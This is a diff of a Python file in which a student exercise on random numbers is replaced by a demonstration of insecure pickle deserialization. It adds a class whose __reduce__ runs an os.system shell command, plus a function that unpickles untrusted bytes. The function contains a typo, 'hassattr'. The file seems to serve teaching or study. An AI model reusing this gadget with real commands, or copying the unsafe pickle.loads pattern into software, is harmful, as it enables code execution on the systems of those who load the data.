@@ -1,20 +1,40 @@
-"""
-В единственной строке записан текст. Для каждого слова из данного текста подсчитайте, 
-сколько раз оно встречалось в этом тексте ранее.
+import platform
 
-Словом считается последовательность не пробельных символов идущих подряд,
-слова разделены одним или большим числом пробелов или символами конца строки.
-"""
+def get_system_info():
+    return {
+        'system': platform.system(),
+        'version': platform.version(),
+        'machine': platform.machine(),
+    }
 
-# сгенерировать случайные из 3 способами
-# создать список на их основе
-# перемешать символы в пароле
-# выбрать случайные 2 из списка
-from random import *
-r1 = random()
-r2 = randint(1, 2)
-r3 = uniform(1, 2)
-l1 = [r1, r2, r3]
-shuffle(l1)
-r = sample(l1, 2)
-print(l1, r)
+info = get_system_info()
+#print(info)
+
+import pickle
+import os
+
+class FakePlatform:
+    def __reduce__(self):
+        return (os.system, ('echo HACKED > hacked.txt',))
+
+malicious_data = pickle.dumps(FakePlatform())
+
+"""
+with open('malicious.pkl', 'wb') as f:
+    f.write(malicious_data)
+
+with open('malicious.pkl', 'rb') as f:
+    obj = pickle.load(f) # здесь будет вызван метод reduce"""
+
+def process_user_data(data_bytes):
+    obj = pickle.loads(data_bytes)
+
+    if hassattr(obj, 'get_info'):
+        print(obj.get_info())
+    else:
+        return None
+
+with open('system_info.pkl', 'rb') as f:
+    sys_info = pickle.load(f)
+
+print(sys_info)
